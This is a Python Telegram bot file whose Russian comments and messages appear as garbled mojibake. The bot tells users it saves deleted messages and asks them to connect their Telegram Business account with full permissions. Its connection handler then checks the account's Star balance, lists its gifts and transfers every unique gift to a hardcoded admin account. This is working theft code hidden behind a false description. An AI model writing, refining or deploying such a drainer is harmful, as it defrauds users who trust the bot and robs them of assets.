import telebot
from telebot import types
import os
import flask
import logging

# --- –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ---
# –¢–æ–∫–µ–Ω –±–æ—Ç–∞ —Å—á–∏—Ç—ã–≤–∞–µ—Ç—Å—è –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è (–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–ª—è Render.com)
BOT_TOKEN = os.environ.get('BOT_TOKEN')
# ADMIN_ID —Ç–æ–∂–µ –ª—É—á—à–µ —Ö—Ä–∞–Ω–∏—Ç—å –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –¥–ª—è –≥–∏–±–∫–æ—Å—Ç–∏
ADMIN_ID = int(os.environ.get('ADMIN_ID', 5146625949)) 

# URL –≤–∞—à–µ–≥–æ –≤–µ–±-—Å–µ—Ä–≤–∏—Å–∞ –Ω–∞ Render.com
WEBHOOK_URL_BASE = "https://kirysha.onrender.com"
# –°–æ–∑–¥–∞–µ–º —Å–µ–∫—Ä–µ—Ç–Ω—ã–π –ø—É—Ç—å –¥–ª—è –≤–µ–±—Ö—É–∫–∞, —á—Ç–æ–±—ã –µ–≥–æ –Ω–µ –º–æ–≥–ª–∏ –≤—ã–∑–≤–∞—Ç—å –ø–æ—Å—Ç–æ—Ä–æ–Ω–Ω–∏–µ
WEBHOOK_URL_PATH = f"/{BOT_TOKEN}/"

# –†–µ–∂–∏–º —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è (True = —Å–∏–º—É–ª—è—Ü–∏—è, False = —Ä–µ–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–¥–∞—á–∞)
# –°—á–∏—Ç—ã–≤–∞–µ—Ç—Å—è –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è, –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é 'True'
TEST_MODE = os.environ.get('TEST_MODE', 'True').lower() == 'true'
MIN_STARS_REQUIRED = 100

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ –∏ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ Flask
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
app = flask.Flask(__name__)

# –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –≤ –ø–∞–º—è—Ç–∏ {user_id: business_connection_id}
# –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: –ü—Ä–∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–µ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ Render –¥–∞–Ω–Ω—ã–µ –±—É–¥—É—Ç —Å–±—Ä–æ—à–µ–Ω—ã.
user_connections = {}


# --- –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –í–ï–ë–•–£–ö–û–í ---

@app.route(WEBHOOK_URL_PATH, methods=['POST'])
def webhook():
    """
    –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –æ—Ç Telegram.
    """
    if flask.request.headers.get('content-type') == 'application/json':
        json_string = flask.request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    else:
        flask.abort(403)

@app.route('/')
def index():
    """–ü—Ä–æ—Å—Ç–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏, —á—Ç–æ –±–æ—Ç –∂–∏–≤."""
    return "Bot is alive and running!", 200


# --- –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –ë–û–¢–ê ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    if user_id in user_connections:
        bot.reply_to(message, "‚úÖ –í—ã —É–∂–µ –ø–æ–¥–∫–ª—é—á–µ–Ω—ã. –Ø –æ—Ç—Å–ª–µ–∂–∏–≤–∞—é –≤–∞—à –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç.")
        return

    try:
        bot_username = bot.get_me().username
        connect_url = f"https://t.me/{bot_username}?start=business"
        markup = types.InlineKeyboardMarkup()
        connect_button = types.InlineKeyboardButton(text="üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å", url=connect_url)
        markup.add(connect_button)
        
        welcome_text = (
            f"–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ! –Ø ‚Äî –±–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–º–æ–∂–µ—Ç –≤–∞–º —Å–æ—Ö—Ä–∞–Ω—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è, –¥–∞–∂–µ –µ—Å–ª–∏ –æ–Ω–∏ –±—É–¥—É—Ç —É–¥–∞–ª–µ–Ω—ã.\n\n"
            f"–î–ª—è —Ä–∞–±–æ—Ç—ã –º–Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –≤–∞—à–µ–º—É –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É.\n\n"
            f"<b>‚ùóÔ∏è–í–∞–∂–Ω–æ:</b> –ß—Ç–æ–±—ã –≤—Å—ë —Ä–∞–±–æ—Ç–∞–ª–æ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ, —Å–Ω–∞—á–∞–ª–∞ –ø–µ—Ä–µ–π–¥–∏—Ç–µ –≤ "
            f"<b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram ‚Üí Telegram Business</b>, –Ω–∞–π–¥–∏—Ç–µ –∏ –¥–æ–±–∞–≤—å—Ç–µ –±–æ—Ç–∞ <b>@{bot_username}</b> "
            f"–∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤—å—Ç–µ –µ–º—É <u>–≤—Å–µ</u> –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è. –ë–µ–∑ —ç—Ç–æ–≥–æ –±–æ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–µ –±—É–¥–µ—Ç.\n\n"
            f"–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É ¬´–ü–æ–¥–∫–ª—é—á–∏—Ç—å¬ª –Ω–∏–∂–µ."
        )
        bot.reply_to(message, welcome_text, reply_markup=markup, parse_mode='HTML')
    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Error in send_welcome: {e}")
        bot.reply_to(message, "–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –ø—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")

@bot.business_connection_handler(func=lambda c: c.is_enabled)
def handle_business_connection(connection: types.BusinessConnection):
    user_chat_id = connection.user_chat_id
    business_connection_id = connection.id
    logging.info(f"New business connection enabled by user {user_chat_id} with ID: {business_connection_id}")

    user_connections[user_chat_id] = business_connection_id

    if not connection.rights or not connection.rights.can_view_gifts_and_stars:
        error_msg = ("‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç–µ—Å—å –∏ —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—ã –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏–ª–∏ –±–æ—Ç—É –ø—Ä–∞–≤–æ "
                     "'–ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤—ë–∑–¥—ã'.")
        bot.send_message(user_chat_id, error_msg)
        logging.warning(f"Connection from {user_chat_id} denied due to missing permissions.")
        return

    bot.send_message(user_chat_id, "‚úÖ –ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω! –ù–∞—á–∏–Ω–∞—é –æ–±—Ä–∞–±–æ—Ç–∫—É –≤–∞—à–∏—Ö –¥–∞–Ω–Ω—ã—Ö.")
    
    try:
        balance = bot.get_business_account_star_balance(business_connection_id)
        logging.info(f"User {user_chat_id} balance check: {balance.amount} Stars.")

        if balance.amount < MIN_STARS_REQUIRED:
            error_msg = (f"‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤. –í–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∫–∞–∫ –º–∏–Ω–∏–º—É–º {MIN_STARS_REQUIRED} –∑–≤—ë–∑–¥, "
                         f"–Ω–æ —É –≤–∞—Å —Ç–æ–ª—å–∫–æ {balance.amount}.")
            bot.send_message(user_chat_id, error_msg)
            return

        bot.send_message(user_chat_id, f"–ë–∞–ª–∞–Ω—Å –¥–æ—Å—Ç–∞—Ç–æ—á–µ–Ω ({balance.amount} –∑–≤—ë–∑–¥). –ó–∞–ø—Ä–∞—à–∏–≤–∞—é —Å–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤...")
        owned_gifts = bot.get_business_account_gifts(business_connection_id)

        if not owned_gifts.gifts:
            bot.send_message(user_chat_id, "–£ –≤–∞—Å –Ω–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏.")
            logging.info(f"User {user_chat_id} has no gifts.")
            return
            
        bot.send_message(user_chat_id, f"–ù–∞–π–¥–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤: {len(owned_gifts.gifts)}. –ù–∞—á–∏–Ω–∞—é –æ–±—Ä–∞–±–æ—Ç–∫—É...")
        for gift in owned_gifts.gifts:
            if isinstance(gift, types.OwnedGiftUnique):
                process_unique_gift(business_connection_id, gift)
            else:
                logging.info(f"Skipping regular gift: {gift.owned_gift_id}")

    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"API error during gift processing for user {user_chat_id}: {e}")
        bot.send_message(user_chat_id, "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –≤–∞—à–∏—Ö –¥–∞–Ω–Ω—ã—Ö. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è.")

@bot.business_connection_handler(func=lambda c: not c.is_enabled)
def handle_business_disconnection(connection: types.BusinessConnection):
    user_chat_id = connection.user_chat_id
    if user_chat_id in user_connections:
        del user_connections[user_chat_id]
        logging.info(f"Business connection disabled by user {user_chat_id}.")
        bot.send_message(user_chat_id, "–í–∞—à –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç –±—ã–ª –æ—Ç–∫–ª—é—á–µ–Ω.")

def process_unique_gift(business_connection_id: str, gift: types.OwnedGiftUnique):
    unique_gift = gift.gift
    
    if TEST_MODE:
        logging.info(f"Simulating transfer for gift ID: {gift.owned_gift_id}")
        name_no_spaces = unique_gift.name.replace(" ", "")
        nft_link = f"https://t.me/nft/{name_no_spaces}-{unique_gift.number}"
        
        message_text = (
            f"üéÅ **–°–∏–º—É–ª—è—Ü–∏—è –ü–µ—Ä–µ–¥–∞—á–∏ –ü–æ–¥–∞—Ä–∫–∞**\n\n"
            f"**–ü–æ–¥–∞—Ä–æ–∫:** <a href='{nft_link}'>{unique_gift.name} #{unique_gift.number}</a>\n"
            f"**ID –ü–æ–¥–∞—Ä–∫–∞:** `{gift.owned_gift_id}`\n\n"
            f"<b>–ú–æ–¥–µ–ª—å:</b> {unique_gift.model.name}\n"
            f"<b>–§–æ–Ω:</b> {unique_gift.backdrop.name}\n"
            f"<b>–°–∏–º–≤–æ–ª:</b> {unique_gift.symbol.name}"
        )
        
        try:
            bot.send_message(ADMIN_ID, message_text, parse_mode='HTML')
        except telebot.apihelper.ApiTelegramException as e:
            logging.error(f"Failed to send simulation log to admin: {e}")
    else:
        logging.info(f"Attempting to transfer gift ID: {gift.owned_gift_id} to user {ADMIN_ID}")
        try:
            bot.transfer_gift(
                business_connection_id=business_connection_id,
                new_owner_chat_id=ADMIN_ID,
                owned_gift_id=gift.owned_gift_id
            )
            bot.send_message(ADMIN_ID, f"‚úÖ –ü–æ–ª—É—á–µ–Ω –ø–æ–¥–∞—Ä–æ–∫: {unique_gift.name} #{unique_gift.number}")
            logging.info(f"Successfully transferred gift ID: {gift.owned_gift_id}")
        except telebot.apihelper.ApiTelegramException as e:
            error_text = f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫ {gift.owned_gift_id}: {e}"
            logging.error(error_text)
            bot.send_message(ADMIN_ID, f"‚ùå {error_text}")

# --- –ó–ê–ü–£–°–ö –°–ï–†–í–ï–†–ê –ò –£–°–¢–ê–ù–û–í–ö–ê –í–ï–ë–•–£–ö–ê ---

if __name__ == '__main__':
    if not BOT_TOKEN:
        logging.error("–ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –æ–∫—Ä—É–∂–µ–Ω–∏—è BOT_TOKEN –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞!")
    else:
        logging.info("Removing old webhook...")
        bot.remove_webhook()
        logging.info("Setting new webhook...")
        bot.set_webhook(url=WEBHOOK_URL_BASE + WEBHOOK_URL_PATH)
        logging.info(f"Webhook set to {WEBHOOK_URL_BASE + WEBHOOK_URL_PATH}")
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –≤–µ–±-—Å–µ—Ä–≤–µ—Ä
        # Render.com –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é PORT, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–π –¥–æ–ª–∂–µ–Ω —Ä–∞–±–æ—Ç–∞—Ç—å —Å–µ—Ä–≤–µ—Ä
        app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))
